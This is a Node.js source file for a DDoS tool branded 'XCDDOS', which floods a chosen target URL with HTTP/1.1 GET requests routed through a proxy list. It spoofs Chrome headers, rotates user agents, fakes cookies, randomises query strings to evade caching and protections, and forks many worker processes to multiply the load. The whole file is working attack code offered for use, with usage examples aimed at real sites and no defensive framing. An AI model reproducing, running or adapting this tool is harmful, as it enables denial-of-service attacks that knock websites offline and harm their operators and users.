/*
    HDDH/1.1 flood

    npm install colors
    
    node HDDH1.js target time thread(40) rps(256) proxy.txt --connection 1(keep-alive) 2(close)
*/

process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});

process.on("SIGHUP", () => {
    return 1;
})
process.on("SIGCHILD", () => {
    return 1;
});

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const url = require('url');
const fs = require('fs');
const net = require("net");
const cluster = require('cluster');
const colors = require('colors');
const os = require('os')

if (process.argv.length < 4) {
    console.clear();
    console.log(`\n         ${'XCDDOS'.red.bold} ${'|'.bold} ${'Xc Corporation'.bold}`);
    console.log('')
    console.log(colors.cyan("                        t.me/Xc_Corporation"));
    console.log(`
    ${`${'HTTP-DDOS BYPASS HTTP/1.1'.underline} | Optional debugging, randrate support, queries support, connection types.`.italic}

    ${'Usage:'.bold.underline}

        ${`node HDD.js ${'['.red.bold}target${']'.red.bold} ${'['.red.bold}duration${']'.red.bold} ${'['.red.bold}threads${']'.red.bold} ${'['.red.bold}rate${']'.red.bold} ${'['.red.bold}proxy${']'.red.bold} ${'('.red.bold}options${')'.red.bold}`.italic}
        ${'node HDD.js https://google.com 300 5 90 proxy.txt --debug true --query 1'.italic}

    ${'Options:'.bold.underline}

        --debug         ${'true'.green}        ${'-'.red.bold}   ${`Debug response codes.`.italic}
        --randrate      ${'true'.green}        ${'-'.red.bold}   ${'Random rate of requests.'.italic}
        --query         ${'1'.yellow}/${'2'.yellow}         ${'-'.red.bold}   ${'Generate query [1: ?q=wsqd], [2: ?wsqd].'.italic}
        --connection    ${'1'.yellow}/${'2'.yellow}         ${'-'.red.bold}   ${'Connection header [1: Keep-Alive], [2: Close].'.italic}
    `);
    process.exit(0)
};

const target = process.argv[2]// || 'https://localhost:443';
const duration = parseInt(process.argv[3])// || 0;
const threads = parseInt(process.argv[4]) || 10;
const rate = process.argv[5] || 64;
const proxyfile = process.argv[6] || 'proxy.txt';

function error(msg) {
    console.log(`   ${'['.red}${'error'.bold}${']'.red} ${msg}`)
    process.exit(0)
}

if (!proxyfile) { error("Invalid proxy file!")}
//if (!target || !target.startsWith('https://')) { error("Invalid target address (https only)!")}
if (!duration || isNaN(duration) || duration <= 0) { error("Invalid duration format!") }
if (!threads || isNaN(threads) || threads <= 0) { error("Invalid threads format!") }
if (!rate || isNaN(rate) || rate <= 0) { error("Invalid ratelimit format!") }

var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
if (proxies.length <= 0) { error("Proxy file is empty!") }
var parsed = url.parse(target);

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--debug', value: get_option('--debug') },
    { flag: '--query', value: get_option('--query') },
    { flag: '--randrate', value: get_option('--randrate') },
    { flag: '--connection', value: get_option('--connection') },
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    } else if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    } else {
        return false;
    }
}

function log(string) {
    if (enabled('debug')) {
        console.log(`${colors.red('[')}${colors.bold('SOCKET')}${colors.red(']')} | ${string}`);
    }
}

function headers() {

    let connection = 'Keep-Alive';

    switch (enabled('connection')) {
        case 2:
            connection = 'Close';
            break;
        case 1:
            connection = 'Keep-Alive';
            break;
        default:
            break;
    }



    const chromeHeaderOrder = [
        "Host",
        "Sec-Ch-Ua",
        "sec-ch-ua-mobile",
        "sec-ch-ua-platform",
        "upgrade-insecure-requests",
        "user-agent",
        "accept",
        "sec-fetch-site",
        "sec-fetch-mode",
        "sec-fetch-user",
        "sec-fetch-dest",
        "referer",
        "accept-encoding",
        "accept-language",
        "cookie",
    ];
    
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edge/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36 Edge/105.0.1343.33",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 Edge/102.0.1245.39",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edge/90.0.818.66",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36 Edge/104.0.1293.70",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.104 Safari/537.36"
];
const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    const chromeHeaders = {
        "host": `${parsed.host}`,
        "sec-ch-ua": "\"Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"macOS\"",
        "upgrade-insecure-requests": "1",
        "user-agent": userAgent,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "referer": `${parsed.href}`,
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,it;q=0.6",
        "connection": connection,
        'cookie': `session=${Math.random().toString(36).substring(2, 15)}; _ga=GA1.2.${Math.floor(Math.random() * 1e10)}.${Math.floor(Date.now() / 1000)}`
    };

    let query = parsed.path;
    const querySystem = enabled('query');
    if (querySystem) {
        switch (querySystem) {
            case 1:
                query = `${parsed.path}?q=${random_string(6, 7)}`;
                break;
            case 2:
                query = `${parsed.path}?${random_string(6, 7)}`;
                break;
            default:
                query = parsed.path;
                break;
        }
    }
    
    let requestString = `GET ${query} HTTP/1.1\r\n`;
    
    chromeHeaderOrder.forEach(header => {
        if (header === 'Host') {
            requestString += `Host: ${parsed.host}\r\n`;
        } else if (chromeHeaders[header]) {
            requestString += `${header.charAt(0) + header.slice(1).replace(/-/g, '-').replace(/\b\w/g, letter => letter)}: ${chromeHeaders[header]}\r\n`;
        }
    });
    
    requestString += `\r\n`;

    return requestString;
}

function random_string(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function random_int(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function attack() {
        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        proxy = proxy.split(':');

        let _rate = rate;

        if (enabled('randrate')) {
            _rate = random_int(1, 90);
        }

        var client = new net.Socket();
        client.connect(proxy[1], proxy[0]);
        client.setKeepAlive(true, 5000);
        client.setTimeout(60000);
        client.once("error", err => {});
        client.once("disconnect", () => {})
        const header = headers();

        function go() {
            for (var i = 0; i < _rate; i++) {
                client.write(header);
            }
            setTimeout(() => {
                go();
            }, 1000 * _rate)
        }

        go();

        client.on("data", (data) => {
            if (enabled('debug')) {
                const buf = data.toString('utf8');
                const bufheader = buf.split('\r\n\r\n')[0];
                const bufstatus = bufheader.split('\r\n')[0];
                if (bufstatus.includes('HTTP/1.1')) {
                    const status = bufstatus.split(' ')[1];
                    if (!isNaN(status)) {
                        let coloredStatus;
                            switch (true) {
                                    case status < 500 && status >= 400 && status !== 404:
                                        coloredStatus = status.toString().red;
                                        break;
                                    case status >= 300 && status < 400:
                                        coloredStatus = status.toString().yellow;
                                        break;
                                    case status === 503:
                                        coloredStatus = status.toString().cyan;
                                        break;
                                    default:
                                        coloredStatus = status.toString().green;
                                        break;
                            }
                        log(`${colors.magenta(proxy[0])}, Status [${coloredStatus}]`);
                    }
                }
            }
            setTimeout(() => {
                client.destroy();
                return delete client;
            }, 5000);
        });
}

if (cluster.isMaster){
    let _options = ""
    for (var x = 0; x < options.length; x++) {
        if (options[x].value !== undefined) {
            _options += `${(options[x].flag).replace('--', '')}, `;
        }
    }

    console.clear();
    console.log(`\n         ${'XCDDOS'.red.bold} ${'|'.bold} ${'Xc Corporation'.white.bold}`);
    console.log('')
    console.log(colors.cyan("                        t.me/Xin_Kenji"));
    console.log(`
            ${'Method'.bold}      ${'-'.red}   ${'['.red} ${`HTTP-DDOS BYPASS HTTP/1.1`.italic} ${']'.red} 
            ${'Target'.bold}      ${'-'.red}   ${'['.red} ${`${target}`.italic} ${']'.red} 
            ${'Time'.bold}        ${'-'.red}   ${'['.red} ${`${duration}`.italic} ${']'.red} 
            ${'Threads'.bold}     ${'-'.red}   ${'['.red} ${`${threads}`.italic} ${']'.red} 
            ${'Rate'.bold}        ${'-'.red}   ${'['.red} ${`${rate}`.italic} ${']'.red}
            ${'Options'.bold}     ${'-'.red}   ${'['.red} ${`${_options}`.italic} ${']'.red}`);

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });
} else {
    setInterval(attack);
    setTimeout(() => process.exit(1), duration * 1000);
}

if (cluster.isMaster) {
    setTimeout(() => {
        console.log("Stopping all workers...");
        for (const id in cluster.workers) {
            cluster.workers[id].kill(); // Hentikan semua worker
        }
        process.exit(0); // Keluar dari proses utama
    }, duration * 1000);
} else {
    setInterval(attack); // Jalankan attack di worker
    setTimeout(() => {
        console.log("Attack finished! Exiting worker...");
        process.exit(0); // Keluar dari worker setelah selesai
    }, duration * 1000);
}

setTimeout(() => {
    if (client) {
        console.log("Destroying client...");
        client.destroy();
    }
}, duration * 1000);